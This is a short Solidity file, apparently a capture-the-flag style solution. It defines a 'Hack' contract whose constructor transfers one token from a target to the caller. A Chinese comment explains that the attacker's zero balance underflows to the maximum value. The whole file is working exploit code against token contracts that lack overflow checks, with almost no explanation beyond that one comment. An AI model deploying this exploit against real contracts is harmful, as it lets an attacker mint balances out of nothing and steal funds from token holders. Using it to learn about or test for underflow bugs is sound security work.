// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address) external view returns (uint balance);
}

// 因为 hack 合约没有任何代币，合约余额会减少直到最大值
contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
